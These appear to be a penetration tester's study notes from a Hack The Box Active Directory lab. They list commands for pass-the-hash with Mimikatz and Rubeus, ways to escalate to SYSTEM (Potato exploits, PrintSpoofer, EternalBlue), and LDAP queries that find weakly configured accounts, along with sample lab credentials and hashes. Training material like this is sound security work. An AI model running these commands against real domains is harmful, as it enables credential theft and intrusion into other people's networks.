xfreerdp /v:<target IP address> /u:htb-student /p:<password> /cert-ignore

Any necessary tools can be found in the c:\tools directory after logging in to the target host.


Changing Domain User Context:

- **CMD - Runas User**
```
runas /netonly /user:htb.local\jackie.may powershell
```

- **CMD - Rubeus.exe Cleartext Credentials**
```
rubeus.exe asktgt /user:jackie.may /domain:htb.local /dc:10.10.110.100 /rc4:ad11e823e1638def97afa7cb08156a94
```

- **CMD - Mimikatz.exe Cleartext Credentials**
```
mimikatz.exe sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94
```

The SYSTEM account on a domain-joined host can enumerate Active Directory **by impersonating the computer account**, which is essentially a special user account. If you land on a domain-joined host with **`SYSTEM`** privileges during an assessment and cannot find any useful credentials in memory or other data on the machine, there are still many things you can do. Having SYSTEM-level access within a domain environment is nearly equivalent to having a domain user account. The only real limitation is not being able to perform cross-trust Kerberos attacks such as Kerberoasting.

- Remote Windows exploits such as EternalBlue or BlueKeep.
- Abusing a service running in the context of the SYSTEM account.
- Abusing SeImpersonate privileges using RottenPotatoNG against older Windows systems, Juicy Potato, or PrintSpoofer if targeting Windows 10/Windows Server 2019.
- Local privilege escalation flaws in Windows operating systems such as the Windows 10 Task Scheduler 0day.
- PsExec with the -s flag


- Reference: https://github.com/breenmachine/RottenPotatoNG
- Reference: https://github.com/ohpe/juicy-potato
- Reference: https://github.com/itm4n/PrintSpoofer
- Reference: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
- Reference: https://blog.0patch.com/2019/06/another-task-scheduler-0day-another.html


By gaining SYSTEM-level access on a domain-joined host, we will be able to:
- Enumerate the domain and gather data such as information about domain users and groups, local administrator access, domain trusts, ACLs, user and computer properties, etc., using BloodHound, and PowerView/SharpView.
- Perform Kerberoasting / ASREPRoasting attacks.
- Run tools such as Inveigh to gather Net-NTLM-v2 hashes or perform relay attacks.
- Perform token impersonation to hijack a privileged domain user account.
- Carry out ACL attacks.

https://github.com/Kevin-Robertson/Inveigh

Find user DONT_EXPIRE_PASSWORD:
```
ldapsearch-ad.py -l 10.129.98.106 -d inlanefreight -u james.cross -p Academy_Student! -t show-user -s "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=262144))"
```

Find user `ENCRYPTED_TEXT_PWD_ALLOWED`
```
ldapsearch-ad.py -l 10.129.98.106 -d inlanefreight -u james.cross -p Academy_Student! -t show-user -s "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=128))"
```


PowerShell `PASSWD_NOTREQD`:
```
Get-ADUser -Filter {userAccountControl -band 32} -Properties userAccountControl | Select-Object Name, SamAccountName, userAccountControl
```

`whoami /priv` PowerView alternative:
```
(Get-DomainPolicy).PrivilegeRights
```
